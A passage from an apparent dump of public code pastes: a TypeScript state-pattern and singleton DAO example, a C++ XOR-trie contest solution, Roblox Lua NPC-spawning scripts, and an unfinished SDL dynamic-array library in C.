    light.changeState(new YellowState());
  }
}

class TrafficLight {
  private state: TrafficLightState;

  constructor() {
    this.state = new RedState();
  }

  changeState(state: TrafficLightState): void {
    this.state = state;
  }

  proceed(): void {
    this.state.proceed();
  }

  next(): void {
    this.state.next(this);
  }
}

const light = new TrafficLight();

light.proceed(); // Output: STOP! The light is Red.
light.next();

light.proceed(); // Output: GO! The light is Green.
light.next();

light.proceed(); // Output: Be CAREFUL! The light is Yellow.
light.next();
"
iub9cmKA,F,Salvens,C++,Friday 11th of August 2023 03:49:55 AM CDT,"#include <algorithm>
#include <iostream>
#include <array>
#include <vector>
#include <numeric>
#include <random>
#include <chrono>


using namespace std;

//#define int long long
#pragma comment(linker,""/STACK:1000000000,1000000000"")

const long long INF = 1e9 + 7;
const int MAXN = 1e6 + 5;
const int N = 1e5 + 10;

int n, k;

struct vertex {
    int next[2] = {0, 0};
} v[30 * MAXN];

array<int, 30 * MAXN> cn;

int root = 0, top = 1;

inline void add(int x) {
    int cur = root;
    for (int i = 29; i >= 0; --i) {
        int b = bool(x & (1 << i));
        if (v[cur].next[b] == 0) {
            v[cur].next[b] = top++;
        }
        cur = v[cur].next[b];
        ++cn[cur];
    }
}

long long ans = 0;

inline void find(int x) {
    int cur = 0;
    for (int i = 29; i >= 0; --i) {
        int b = bool(x & (1 << i));
        if (k & (1 << i)) {
            if (v[cur].next[1 - b] == 0) {
                return;
            }
            cur = v[cur].next[1 - b];
        } else {
            if (v[cur].next[1 - b] != 0) {
                ans += cn[v[cur].next[1 - b]];
            }
            if (v[cur].next[b] == 0) {
                return;
            }
            cur = v[cur].next[b];
        }
    }
    ans += cn[cur];
}

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);

    add(0);

    cin >> n >> k;
    int sum = 0;
    for (int i = 0; i < n; ++i) {
        int x;
        cin >> x;
        sum ^= x;
        find(sum);
        add(sum);
    }
    cout << ans << '\n';
}"
gsyWNizX,Module Script,HowToRoblox,Lua,Friday 11th of August 2023 03:33:05 AM CDT,"local npcs = script:WaitForChild(""NPCs"")

local rnd = Random.new()

local cs = game:GetService(""Chat"")


function npcChat(npc: Model)
	cs:Chat(npc.Head, ""No you're not!"", Enum.ChatColor.White)
end

function createNPCs(plr: Player)
	
	local char = plr.Character
	local root = char:FindFirstChild(""HumanoidRootPart"")
	
	if not char or not root or not char:FindFirstChild(""Humanoid"") or char.Humanoid.Health <= 0 then return end
	
	if char:FindFirstChild(""NOT LONELY"") then
		
		for _, npc in pairs(workspace[plr.Name .. "" NPCs""]:GetChildren()) do
			npcChat(npc)
		end
		
		return
	end
	
	local notLonelyValue = Instance.new(""StringValue"")
	notLonelyValue.Name = ""NOT LONELY""
	notLonelyValue.Parent = char
	
	local numNPCs = rnd:NextInteger(70, 100)
	
	local allNPCs = npcs:GetChildren()
	
	local npcContainer = Instance.new(""Folder"")
	npcContainer.Name = plr.Name .. "" NPCs""
	npcContainer.Parent = workspace
	
	char.Humanoid.Died:Connect(function()
		npcContainer:Destroy()
	end)
	
	for i = 1, numNPCs do
		
		if npcContainer then
			
			local randomNPC = allNPCs[rnd:NextInteger(1, #allNPCs)]:Clone()
			
			randomNPC.HumanoidRootPart.CFrame = CFrame.new(root.Position - (root.CFrame.LookVector * i * 1.4 * Vector3.new(1, 0, 1)), root.Position)
			
			task.spawn(function()
				
				local conn
				conn = game:GetService(""RunService"").Heartbeat:Connect(function()
					
					if randomNPC and randomNPC.Parent == npcContainer then
						randomNPC.Humanoid:MoveTo(root.Position - (root.CFrame.LookVector * i * 1.4 * Vector3.new(1, 0, 1)))
					else
						conn:Disconnect()
					end
				end)
			end)
			
			randomNPC.Humanoid.Died:Connect(function()
				
				randomNPC:Destroy()
				
				if #npcContainer:GetChildren() == 0 then
					npcContainer:Destroy()
					notLonelyValue:Destroy()	
				end
			end)
			
			randomNPC.Parent = npcContainer
			
			npcChat(randomNPC)
				
			task.wait(0.05)
			
		else
			break
		end
	end
end


return createNPCs"
trMZBL2L,Main Script,HowToRoblox,Lua,Friday 11th of August 2023 03:32:47 AM CDT,"local message = ""im so lonely""
local allowedChars = ""abcdefghijklmnopqrstuvwxyz ""
allowedChars = allowedChars:split("""")

local createNPCs = require(script:WaitForChild(""CreateNPCs""))

function filterMessage(msg: string)
	
	msg = msg:lower()
	local filteredMsg = """"

	for _, char in pairs(msg:split("""")) do

		if table.find(allowedChars, char) then
			filteredMsg = filteredMsg .. char
		end
	end
	
	return filteredMsg
end

game.Players.PlayerAdded:Connect(function(plr)
	
	plr.Chatted:Connect(function(msg, _recipient)
		
		msg = filterMessage(msg)
		
		if msg == message then
			
			createNPCs(plr)
		end
	end)
end)"
j8h97hKZ,Singleton & ProductDAO Example,Idanref,TypeScript,Friday 11th of August 2023 03:30:20 AM CDT,"import { writeFileSync } from 'fs';

interface Product {
  id: string;
  price: number;
  name: string;
}

interface ProductDAO { // separation of the data logic (like Model)
  addProduct(product: Product): void;
  updateProduct(product: Product): void;
  deleteProduct(id: string): void;
  getProduct(id: string): Product;
}

class ProductDAOImpl implements ProductDAO { // Using singleton
  private static instance: ProductDAOImpl;

  private constructor() {}

  public static getInstance(): ProductDAOImpl {
    if (!ProductDAOImpl.instance) {
      ProductDAOImpl.instance = new ProductDAOImpl();
    }
    return ProductDAOImpl.instance;
  }

  addProduct(product: Product): void {
    const path = `./products/${product.id}.json`;
    writeFileSync(path, JSON.stringify(product));
    console.log(`Product with ID ${product.id} has been saved.`);
  }

  updateProduct(product: Product): void {
    throw new Error('UnsupportedOperationException');
  }

  deleteProduct(id: string): void {
    throw new Error('UnsupportedOperationException');
  }

  getProduct(id: string): Product {
    throw new Error('UnsupportedOperationException');
  }
}

const productDAO = ProductDAOImpl.getInstance();

const product: Product = {
  id: '123',
  price: 99.99,
  name: 'Laptop',
};

productDAO.addProduct(product);
"
0BJpeQtP,kit_sdl2_coreVector.c (WIP; to be fully tested),Kitomas,C,Friday 11th of August 2023 03:24:15 AM CDT,"//my own primitive form of contiguous dynamic arrays
#include ""../include/kit_sdl2/kit_core.h""
#include ""../_private/include/_kit_privmacro.h""


//initializes any added memory if difference is positive
int _kit_coreVectorRealloc(void* ptr_p, char axis,
                           Uint32 osize, Uint32 nsize)
{
  if(osize==nsize) return 0;
  void* _ptr=SDL_realloc(*(void**)ptr_p,nsize);
  if(_ptr==NULL){
    if(axis!=0) SDL_SetError(""SDL_realloc() of %c axis failed"",axis);
    return -1;
  }
  Uint32 size_diff=nsize-osize;
  if(size_diff>0) SDL_memset(_ptr+osize,0,size_diff);
  *(void**)ptr_p=_ptr;
  return 0;
}


void _kit_coreVectorFreeZinY(kit_coreVector* Vector,
                             Uint32 x_start, Uint32 x_end,
                             Uint32 y_start, Uint32 y_end)
{
  if(Vector->_dims<3) return; //z doesn't exist in 1d or 2d array
  void*** p3d=Vector->p3d;
  for(Uint32 xi=x_start; xi<x_end; ++xi){ void** p2d=p3d[xi];
    if(p2d==NULL) break;
    for(Uint32 yi=y_start; yi<y_end; ++yi){ void* p1d=p2d[yi];
      if(p1d==NULL) break;
      SDL_free(p1d); p2d[yi]=NULL;
    }
  }
}

void _kit_coreVectorFreeYinX(kit_coreVector* Vector,
                             Uint32 x_start, Uint32 x_end)
{
  if(Vector->_dims<2) return; //y doesn't exist in 1d array
  void** p2d=Vector->p2d;
  for(Uint32 xi=x_start; xi<x_end; ++xi){ void* p1d=p2d[xi];
    if(p1d==NULL) break;
    SDL_free(p1d); p2d[xi]=NULL;
  }
}


int _kit_coreVectorResizeX(kit_coreVector** Vector_p,
                           Uint32 x_osize, Uint32 x_nsize, Uint32 x_new)
{
  kit_coreVector* Vector=*Vector_p;
  if(Vector->x==x_new) return 0;
  //x axis is contiguous with the vector struct itself
  x_osize+=sizeof(kit_coreVector); x_nsize+=sizeof(kit_coreVector);
  if(_kit_coreVectorRealloc(Vector_p,'x', x_osize,x_nsize)) return -12;
  Vector->ptr=(void*)Vector;
  Vector->x=x_new;
  return 0;
}

int _kit_coreVectorResizeY(kit_coreVector* Vector,
                           Uint32 x_start, Uint32 x_end,
                           Uint32 y_osize, Uint32 y_nsize, Uint32 y_new)
{
  if(Vector->_dims<2) return 0; //y doesn't exist in 1d array
  if(Vector->y==y_new) return 0;
  void** p2d=Vector->p2d;
  for(Uint32 xi=x_start; xi<x_end; ++xi)
    if(_kit_coreVectorRealloc(&p2d[xi],'y', y_osize,y_nsize)) return -13;
  Vector->y=y_new;
  return 0;
}

int _kit_coreVectorResizeZ(kit_coreVector* Vector,
                           Uint32 x_start, Uint32 x_end,
                           Uint32 y_start, Uint32 y_end,
                           Uint32 z_osize, Uint32 z_nsize, Uint32 z_new)
{
  if(Vector->_dims<3) return 0; //z doesn't exist in 1d or 2d array
  if(Vector->z==z_new) return 0;
  void*** p3d=Vector->p3d;
  for(Uint32 xi=x_start; xi<x_end; ++xi){ void** p2d=p3d[xi];
    for(Uint32 yi=y_start; yi<y_end; ++yi)
      if(_kit_coreVectorRealloc(&p2d[yi],'z', z_osize,z_nsize)) return -14;
  }
  Vector->z=z_new;
  return 0;
}

//uninitialize rS where it isn't needed
//un-inline these if binary size becomes unacceptable!
//(remember, <xyz>_old and <xyz>_new are sometimes flipped when used as a parameter when freeing)
static inline int _kit_coreVectorSubX(kit_coreVector** Vector_p,
                                      Uint32 x_new,   Uint32 x_old, Uint32 y_old,
                                      Uint32 x_osize, Uint32 x_nsize)
{
  kit_coreVector* Vector=*Vector_p;
  _kit_coreVectorFreeZinY(Vector, x_new,x_old, 0,y_old);
  _kit_coreVectorFreeYinX(Vector, x_new,x_old);
  return _kit_coreVectorResizeX(Vector_p, x_osize,x_nsize, x_new);
}

static inline int _kit_coreVectorSubY(kit_coreVector* Vector,
                                      Uint32 x_new,   Uint32 y_old, Uint32 y_new,
                                      Uint32 y_osize, Uint32 y_nsize)
{
  _kit_coreVectorFreeZinY(Vector, 0,x_new, y_old,y_new);
  return _kit_coreVectorResizeY(Vector, 0,x_new, y_osize,y_nsize, y_new);
}

static inline int _kit_coreVectorSubZ(kit_coreVector* Vector,
                                      Uint32 x_new,   Uint32 y_new, Uint32 z_osize,
                                      Uint32 z_nsize, Uint32 z_new)
{
  return _kit_coreVectorResizeZ(Vector, 0,x_new, 0,y_new, z_osize,z_nsize, z_new);
}

static inline int _kit_coreVectorSubXY(kit_coreVector** Vector_p,
                                       Uint32 x_new,   Uint32 x_old, Uint32 y_old,
                                       Uint32 x_osize, Uint32 x_nsize,
                                       Uint32 y_new,   Uint32 y_osize, Uint32 y_nsize)
{
  kit_coreVector* Vector=*Vector_p; int rS=0; //(r)eturn(S)tatus
  _kit_coreVectorFreeZinY(Vector, x_new,x_old, 0,y_old);
  _kit_coreVectorFreeYinX(Vector, x_new,x_old);
  if((rS=_kit_coreVectorResizeX(Vector_p, x_osize,x_nsize, x_new))) return rS;
  _kit_coreVectorFreeZinY(Vector, 0,x_new, y_new,y_old);
  return _kit_coreVectorResizeY(Vector, 0,x_new, y_osize,y_nsize, y_new);
}

static inline int _kit_coreVectorSubYZ(kit_coreVector* Vector,
                                       Uint32 x_new,   Uint32 y_old,   Uint32 y_new,
                                       Uint32 y_osize, Uint32 y_nsize,
                                       Uint32 z_osize, Uint32 z_nsize, Uint32 z_new)
{
  int rS=0; //(r)eturn(S)tatus
  _kit_coreVectorFreeZinY(Vector, 0,x_new, y_new,y_old);
  if((rS=_kit_coreVectorResizeY(Vector, 0,x_new, y_osize,y_nsize, y_new))) return rS;
  return _kit_coreVectorResizeZ(Vector, 0,x_new, 0,y_new, z_osize,z_nsize, z_new);
}

static inline int _kit_coreVectorSubXZ(kit_coreVector** Vector_p,
                                       Uint32 x_new,   Uint32 x_old,   Uint32 y_new,
                                       Uint32 x_osize, Uint32 x_nsize,
                                       Uint32 z_osize, Uint32 z_nsize, Uint32 z_new)
{
  kit_coreVector* Vector=*Vector_p; int rS=0; //(r)eturn(S)tatus
  _kit_coreVectorFreeZinY(Vector, x_new,x_old, 0,y_new);
  _kit_coreVectorFreeYinX(Vector, x_new,x_old);
  if((rS=_kit_coreVectorResizeX(Vector_p, x_osize,x_nsize, x_new))) return rS;
  return _kit_coreVectorResizeZ(Vector, 0,x_new, 0,y_new, z_osize,z_nsize, z_new);
}

static inline int _kit_coreVectorSubXYZ(kit_coreVector** Vector_p,
                                        Uint32 x_new,   Uint32 x_old,   Uint32 y_old,
                                        Uint32 x_osize, Uint32 x_nsize,
                                        Uint32 y_new,   Uint32 y_osize, Uint32 y_nsize,
                                        Uint32 z_osize, Uint32 z_nsize, Uint32 z_new)
{
  kit_coreVector* Vector=*Vector_p; int rS=0; //(r)eturn(S)tatus
  _kit_coreVectorFreeZinY(Vector, x_new,x_old, 0,y_old);
  _kit_coreVectorFreeYinX(Vector, x_new,x_old);
  if((rS=_kit_coreVectorResizeX(Vector_p, x_osize,x_nsize, x_new))) return rS;
  _kit_coreVectorFreeZinY(Vector, 0,x_new, y_new,y_old);
  if((rS=_kit_coreVectorResizeY(Vector, 0,x_new, y_osize,y_nsize, y_new))) return rS;
  return _kit_coreVectorResizeZ(Vector, 0,x_new, 0,y_new, z_osize,z_nsize, z_new);
}


static inline int _kit_coreVectorAddX(kit_coreVector** Vector_p,
                                      Uint32 x_osize, Uint32 x_nsize, Uint32 x_new,
                                      Uint32 x_old,   Uint32 y_nsize, Uint32 y_new,
                                      Uint32 z_nsize, Uint32 z_new)
{
  kit_coreVector* Vector=*Vector_p; int rS=0; //(r)eturn(S)tatus
  if((rS=_kit_coreVectorResizeX(Vector_p, x_osize,x_nsize, x_new))) return rS;
  if((rS=_kit_coreVectorResizeY(Vector, x_old,x_new, 0,y_nsize, y_new))) return rS;
  return _kit_coreVectorResizeZ(Vector, x_old,x_new, 0,y_nsize, 0,z_nsize, z_new);
}

static inline int _kit_coreVectorAddY(kit_coreVector* Vector,
                                      Uint32 x_new, Uint32 y_osize, Uint32 y_nsize, Uint32 y_new,
                                      Uint32 y_old, Uint32 z_nsize, Uint32 z_new)
{
  int rS=0; //(r)eturn(S)tatus
  if((rS=_kit_coreVectorResizeY(Vector, 0,x_new, y_osize,y_nsize, y_new))) return rS;
  return _kit_coreVectorResizeZ(Vector, 0,x_new, y_old,y_new, 0,z_nsize, z_new);
}

static inline int _kit_coreVectorAddZ(kit_coreVector* Vector,
                                      Uint32 x_new,   Uint32 y_new,
                                      Uint32 z_osize, Uint32 z_nsize, Uint32 z_new)
{
  return _kit_coreVectorResizeZ(Vector, 0,x_new, 0,y_new, z_osize,z_nsize, z_new);
}

static inline int _kit_coreVectorAddXY(kit_coreVector** Vector_p,
                                       Uint32 x_osize, Uint32 x_nsize, Uint32 x_new,
                                       Uint32 x_old,   Uint32 y_osize, Uint32 y_nsize, Uint32 y_new,
                                       Uint32 y_old,   Uint32 z_osize, Uint32 z_nsize, Uint32 z_new)
{
  kit_coreVector* Vector=*Vector_p; int rS=0; //(r)eturn(S)tatus
  if((rS=_kit_coreVectorResizeX(Vector_p, x_osize,x_nsize, x_new))) return rS;
  if((rS=_kit_coreVectorResizeY(Vector, 0,x_old, y_osize,y_nsize, y_new))) return rS;
  if((rS=_kit_coreVectorResizeY(Vector, x_old,x_new, 0,y_nsize, y_new))) return rS;
  return _kit_coreVectorResizeZ(Vector, 0,x_new, y_old,y_new, z_osize,z_nsize, z_new);
}

static inline int _kit_coreVectorAddYZ(kit_coreVector* Vector,
                                       Uint32 x_new, Uint32 y_osize, Uint32 y_nsize, Uint32 y_new,
                                       Uint32 y_old, Uint32 z_osize, Uint32 z_nsize, Uint32 z_new)
{
  int rS=0; //(r)eturn(S)tatus
  if((rS=_kit_coreVectorResizeY(Vector, 0,x_new, y_osize,y_nsize, y_new))) return rS;
  if((rS=_kit_coreVectorResizeZ(Vector, 0,x_new, 0,y_old, z_osize,z_nsize, z_new))) return rS;
  return _kit_coreVectorResizeZ(Vector, 0,x_new, y_old,y_new, 0,z_nsize, z_new);
}

static inline int _kit_coreVectorAddXZ(kit_coreVector** Vector_p,
                                       Uint32 x_osize, Uint32 x_nsize, Uint32 x_new,
                                       Uint32 x_old,   Uint32 y_nsize, Uint32 y_new,
                                       Uint32 z_osize, Uint32 z_nsize, Uint32 z_new)
{
  kit_coreVector* Vector=*Vector_p; int rS=0; //(r)eturn(S)tatus
  if((rS=_kit_coreVectorResizeX(Vector_p, x_osize,x_nsize, x_new))) return rS;
  if((rS=_kit_coreVectorResizeY(Vector, x_old,x_new, 0,y_nsize, y_new))) return rS;
  return _kit_coreVectorResizeZ(Vector, 0,x_new, 0,y_new, z_osize,z_nsize, z_new);
}

static inline int _kit_coreVectorAddXYZ(kit_coreVector** Vector_p,
                                        Uint32 x_osize, Uint32 x_nsize, Uint32 x_new,
                                        Uint32 x_old,   Uint32 y_osize, Uint32 y_nsize, Uint32 y_new,
                                        Uint32 y_old,   Uint32 z_osize, Uint32 z_nsize, Uint32 z_new)
{
  kit_coreVector* Vector=*Vector_p; int rS=0; //(r)eturn(S)tatus
  if((rS=_kit_coreVectorResizeX(Vector_p, x_osize,x_nsize, x_new))) return rS;
  if((rS=_kit_coreVectorResizeY(Vector, 0,x_old, y_osize,y_osize, y_new))) return rS;
  if((rS=_kit_coreVectorResizeY(Vector, x_old,x_new, 0,y_osize, y_new))) return rS;
  if((rS=_kit_coreVectorResizeZ(Vector, 0,x_new, 0,y_old, z_osize,z_nsize, z_new))) return rS;
  return _kit_coreVectorResizeZ(Vector, 0,x_new, y_old,y_new, 0,z_nsize, z_new);
}


#define _0X (0x000)
#define _NX (0x100)
#define _PX (0x300)
#define _0Y (0x000)
#define _NY (0x010)
#define _PY (0x030)
#define _0Z (0x000)
#define _NZ (0x001)
#define _PZ (0x003)
#define _VADECISION(_action) \
  if((returnStatus=_action)){ goto _error_; }
#define _VADECISION_B(_action) _VADECISION(_action) break;
//add to or subtract from size
int kit_coreVectorAdd(kit_coreVector** Vector_p, Sint32 x_add, Sint32 y_add, Sint32 z_add){
  if(!x_add && !y_add && !z_add) return 0;
  int returnStatus=0;
  _IF_SDLERR_I(Vector_p==NULL,-1,;,""Vector_p cannot be NULL"")
  kit_coreVector* Vector=*Vector_p;
  _IF_SDLERR_I(Vector==NULL,-2,;,""*Vector_p cannot be NULL"")

  Uint32 unit=Vector->unit;
  Uint32 x_old=Vector->x,   y_old=Vector->y,   z_old=Vector->z;
       _IF_SDLERR_I( (!z_old)&&(z_add!=0) ,-3,;,""cannot change z on non-3d vector"")
  else _IF_SDLERR_I( (!y_old)&&(y_add!=0) ,-4,;,""cannot change y on 1d vector"")
  Uint32 x_new=x_old+x_add, y_new=y_old+y_add, z_new=z_old+z_add;
       _IF_SDLERR_I( (!z_old)!=(!z_add) ,-5,;,""resulting z cannot have its axis status flipped"")
  else _IF_SDLERR_I( (!y_old)!=(!y_add) ,-6,;,""resulting y cannot have its axis status flipped"")

  //check for any underflows and overflows respectively (and some dimension error checks)
   //x
       _IF_SDLERR_I( x_add<0&&(x_new>x_old) ,-7,;,""resulting x cannot be 0"")
  else _IF_SDLERR_I( x_add>0&&(x_new<x_old) ,-8,;,""applying x_add caused an overflow"")
   //y
  if(y_add<0 && (y_new>y_old)) y_new=0;
  else _IF_SDLERR_I( y_add>0&&(y_new<y_old) ,-9,;,""applying y_add caused an overflow"")
  else _IF_SDLERR_I( y_new==0 && z_new>0 ,-10,;,""resulting y cannot be 0 if z>0"")
   //z
  if(z_add<0 && (z_new>z_old)) z_new=0;
  else _IF_SDLERR_I( z_add>0&&(z_new<z_old) ,-11,;,""applying z_add caused an overflow"")

  Uint32 x_unit, y_unit, z_unit;
  x_unit=y_unit=z_unit = sizeof(void*);
  int decision, dims=(x_new!=0)+(y_new!=0)+(z_new!=0); //dim(ension)s
       if(dims==1) x_unit=unit;
  else if(dims==2) y_unit=unit;
  else             z_unit=unit; //(dims==3)
  Uint32 x_osize=x_unit*x_old, y_osize=y_unit*y_old, z_osize=z_unit*z_old;
  Uint32 x_nsize=x_unit*x_new, y_nsize=y_unit*y_new, z_nsize=z_unit*z_new;

  decision =( ((x_new>0)<<1)|(x_new!=0) )<<12; //0x0000 -> 0x3000
  decision|=( ((y_new>0)<<1)|(y_new!=0) )<< 8; //0x0000 -> 0x0300
  decision|=( ((z_new>0)<<1)|(z_new!=0) )<< 4; //0x0000 -> 0x0030
  switch(decision){
  //SUB
  case (_NX|_0Y|_0Z): //_NX_0Y_0Z; technically a superset of: (n/a)
    _VADECISION_B(_kit_coreVectorSubX( &Vector,x_new,x_old,y_old,x_osize,x_nsize ))
  case (_0X|_NY|_0Z): //_0X_NY_0Z; technically a superset of: (n/a)
    _VADECISION_B(_kit_coreVectorSubY( Vector,x_new,y_old,y_new,y_osize,y_nsize ))
  case (_0X|_0Y|_NZ): //_0X_0Y_NZ; technically a superset of: (n/a)
    _VADECISION_B(_kit_coreVectorSubZ( Vector,x_new,y_new,z_osize,z_nsize,z_new ))
  case (_NX|_NY|_0Z): //_NX_NY_0Z; technically a superset of: (_NX_0Y_0Z,_0X_NY_0Z)
    _VADECISION_B(_kit_coreVectorSubXY( &Vector,x_new,x_old,y_old,x_osize,x_nsize,y_new,y_osize,y_nsize ))
  case (_0X|_NY|_NZ): //_0X_NY_NZ; technically a superset of: (_0X_NY_0Z,_0X_0Y_NZ)
    _VADECISION_B(_kit_coreVectorSubYZ( Vector,x_new,y_old,y_new,y_osize,y_nsize,z_osize,z_nsize,z_new ))
  case (_NX|_0Y|_NZ): //_NX_0Y_NZ; technically a superset of: (_NX_0Y_0Z,_0X_0Y_NZ)
    _VADECISION_B(_kit_coreVectorSubXZ( &Vector,x_new,x_old,y_new,x_osize,x_nsize,z_osize,z_nsize,z_new ))
  case (_NX|_NY|_NZ): //_NX_NY_NZ; technically a superset of: (_NX_NY_0Z,_0X_0Y_NZ)
    _VADECISION_B(_kit_coreVectorSubXYZ( &Vector,x_new,x_old,y_old,x_osize,x_nsize,y_new,y_osize,y_nsize,z_osize,z_nsize,z_new ))
  //ADD
  case (_PX|_0Y|_0Z): //_PX_0Y_0Z; technically a superset of: (n/a)
    _VADECISION_B(_kit_coreVectorAddX( &Vector,x_osize,x_nsize,x_new,x_old,y_nsize,y_new,z_nsize,z_new ))
  case (_0X|_PY|_0Z): //_0X_PY_0Z; technically a superset of: (n/a)
    _VADECISION_B(_kit_coreVectorAddY( Vector,x_new,y_osize,y_nsize,y_new,y_old,z_nsize,z_new ))
  case (_0X|_0Y|_PZ): //_0X_0Y_PZ; technically a superset of: (n/a)
    _VADECISION_B(_kit_coreVectorAddZ( Vector,x_new,y_new,z_osize,z_nsize,z_new ))
  case (_PX|_PY|_0Z): //_PX_PY_0Z; technically a superset of: (_PX_0Y_0Z,_0X_PY_0Z)
    _VADECISION_B(_kit_coreVectorAddXY( &Vector,x_osize,x_nsize,x_new,x_old,y_osize,y_nsize,y_new,y_old,z_osize,z_nsize,z_new ))
  case (_0X|_PY|_PZ): //_0X_PY_PZ; technically a superset of: (_0X_PY_0Z,_0X_0Y_PZ)
    _VADECISION_B(_kit_coreVectorAddYZ( Vector,x_new,y_osize,y_nsize,y_new,y_old,z_osize,z_nsize,z_new ))
  case (_PX|_0Y|_PZ): //_PX_0Y_PZ; technically a superset of: (_PX_0Y_0Z,_0X_0Y_PZ)
    _VADECISION_B(_kit_coreVectorAddXZ( &Vector,x_osize,x_nsize,x_new,x_old,y_nsize,y_new,z_osize,z_nsize,z_new ))
  case (_PX|_PY|_PZ): //_PX_PY_PZ; technically a superset of: (_PX_PY_0Z,_0X_0Y_PZ)
    _VADECISION_B(_kit_coreVectorAddXYZ( &Vector,x_osize,x_nsize,x_new,x_old,y_osize,y_nsize,y_new,y_old,z_osize,z_nsize,z_new ))
  //SUBX ADDYZ
  case (_NX|_PY|_0Z): //_NX_PY_0Z; technically a superset of: (_NX_0Y_0Z, _0X_PY_0Z)
    _VADECISION(  _kit_coreVectorSubX( &Vector,x_new,x_old,y_old,x_osize,x_nsize ))
    _VADECISION_B(_kit_coreVectorAddY( Vector,x_new,y_osize,y_nsize,y_new,y_old,z_nsize,z_new ))
  case (_NX|_0Y|_PZ): //_NX_0Y_PZ; technically a superset of: (_NX_0Y_0Z, _0X_0Y_PZ)
    _VADECISION(  _kit_coreVectorSubX( &Vector,x_new,x_old,y_old,x_osize,x_nsize ))
    _VADECISION_B(_kit_coreVectorAddZ( Vector,x_new,y_new,z_osize,z_nsize,z_new ))
  case (_NX|_PY|_PZ): //_NX_PY_PZ; technically a superset of: (_NX_0Y_0Z, _0X_PY_PZ)
    _VADECISION(  _kit_coreVectorSubX( &Vector,x_new,x_old,y_old,x_osize,x_nsize ))
    _VADECISION_B(_kit_coreVectorAddYZ( Vector,x_new,y_osize,y_nsize,y_new,y_old,z_osize,z_nsize,z_new ))
  //SUBY ADDXZ
  case (_PX|_NY|_0Z): //_PX_NY_0Z; technically a superset of: (_0X_NY_0Z, _PX_0Y_0Z)
    _VADECISION(  _kit_coreVectorSubY( Vector,x_new,y_old,y_new,y_osize,y_nsize ))
    _VADECISION_B(_kit_coreVectorAddX( &Vector,x_osize,x_nsize,x_new,x_old,y_nsize,y_new,z_nsize,z_new ))
  case (_0X|_NY|_PZ): //_0X_NY_PZ; technically a superset of: (_0X_NY_0Z, _0X_0Y_PZ)
    _VADECISION(  _kit_coreVectorSubY( Vector,x_new,y_old,y_new,y_osize,y_nsize ))
    _VADECISION_B(_kit_coreVectorAddZ( Vector,x_new,y_new,z_osize,z_nsize,z_new ))
  case (_PX|_NY|_PZ): //_PX_NY_PZ; technically a superset of: (_0X_NY_0Z, _PX_0Y_PZ)
    _VADECISION(  _kit_coreVectorSubY( Vector,x_new,y_old,y_new,y_osize,y_nsize ))
    _VADECISION_B(_kit_coreVectorAddXZ( &Vector,x_osize,x_nsize,x_new,x_old,y_nsize,y_new,z_osize,z_nsize,z_new ))
  //SUBZ ADDXY
  case (_PX|_0Y|_NZ): //_PX_0Y_NZ; technically a superset of: (_0X_0Y_NZ, _PX_0Y_0Z)
    _VADECISION(  _kit_coreVectorSubZ( Vector,x_new,y_new,z_osize,z_nsize,z_new ))
    _VADECISION_B(_kit_coreVectorAddX( &Vector,x_osize,x_nsize,x_new,x_old,y_nsize,y_new,z_nsize,z_new ))
  case (_0X|_PY|_NZ): //_0X_PY_NZ; technically a superset of: (_0X_0Y_NZ, _0X_PY_0Z)
    _VADECISION(  _kit_coreVectorSubZ( Vector,x_new,y_new,z_osize,z_nsize,z_new ))
    _VADECISION_B(_kit_coreVectorAddY( Vector,x_new,y_osize,y_nsize,y_new,y_old,z_nsize,z_new ))
  case (_PX|_PY|_NZ): //_PX_PY_NZ; technically a superset of: (_0X_0Y_NZ, _PX_PY_0Z)
    _VADECISION(  _kit_coreVectorSubZ( Vector,x_new,y_new,z_osize,z_nsize,z_new ))
    _VADECISION_B(_kit_coreVectorAddXY( &Vector,x_osize,x_nsize,x_new,x_old,y_osize,y_nsize,y_new,y_old,z_osize,z_nsize,z_new ))
  //SUBXYZ ADDXYZ
  case (_NX|_NY|_PZ): //_NX_NY_PZ; technically a superset of: (_NX_NY_0Z, _0X_0Y_PZ)
    _VADECISION(  _kit_coreVectorSubXY( &Vector,x_new,x_old,y_old,x_osize,x_nsize,y_new,y_osize,y_nsize ))
    _VADECISION_B(_kit_coreVectorAddZ( Vector,x_new,y_new,z_osize,z_nsize,z_new ))
  case (_PX|_NY|_NZ): //_PX_NY_NZ; technically a superset of: (_0X_NY_NZ, _PX_0Y_0Z)
    _VADECISION(  _kit_coreVectorSubYZ( Vector,x_new,y_old,y_new,y_osize,y_nsize,z_osize,z_nsize,z_new ))
    _VADECISION_B(_kit_coreVectorAddX( &Vector,x_osize,x_nsize,x_new,x_old,y_nsize,y_new,z_nsize,z_new ))
  case (_NX|_PY|_NZ): //_NX_PY_NZ; technically a superset of: (_NX_0Y_NZ, _0X_PY_0Z)
    _VADECISION(  _kit_coreVectorSubXZ( &Vector,x_new,x_old,y_new,x_osize,x_nsize,z_osize,z_nsize,z_new ))
    _VADECISION_B(_kit_coreVectorAddY( Vector,x_new,y_osize,y_nsize,y_new,y_old,z_nsize,z_new ))
  default: _IS_SDLERR_I(-15,;,""decision switch defaulted (this shouldn't be possible); decision=0x%X"",decision)
  }
  *Vector_p=Vector;
  _error_:
  return returnStatus;
}
//set new size (if an axis == 0, then leave that axis unchanged)
int kit_coreVectorSet(kit_coreVector** Vector_p, Uint32 x_new, Uint32 y_new, Uint32 z_new){
  int returnStatus=0;
  _IF_SDLERR_I(Vector_p==NULL,-1,;,""Vector_p cannot be NULL"")
  kit_coreVector* Vector=*Vector_p;
  _IF_SDLERR_I(Vector==NULL,-2,;,""*Vector_p cannot be NULL"")

  Uint32 x_old =Vector->x, y_old =Vector->y, z_old=Vector->z;
  Sint32 x_diff=(x_new==0) ? 0 : x_new-x_old;
  Sint32 y_diff=(y_new==0) ? 0 : y_new-y_old;
  Sint32 z_diff=(z_new==0) ? 0 : z_new-z_old;

  returnStatus=kit_coreVectorAdd(Vector_p, x_diff,y_diff,z_diff);

  _error_:
  return returnStatus;
}


int kit_coreVectorDestroy(kit_coreVector** Vector_p){
  int returnStatus=0;
  _IF_SDLERR_I(Vector_p==NULL,-1,;,""Vector_p cannot be NULL"")
  kit_coreVector* Vector=*Vector_p;
  _IF_SDLERR_I(Vector==NULL,-2,;,""*Vector_p cannot be NULL"")

  void *p1d, **p2d, ***p3d;
  int x=Vector->x, y=Vector->y; //z=Vector->z;
  Sint32 condition=Vector->_dims&3;
  if(!condition) condition=(x!=0) + (y!=0) + (Vector->z!=0);

  //condition must be equal to the number of dimensions (1=1d,2=2d,3=3d)
  switch(condition){
  case 3: p3d=Vector->p3d;
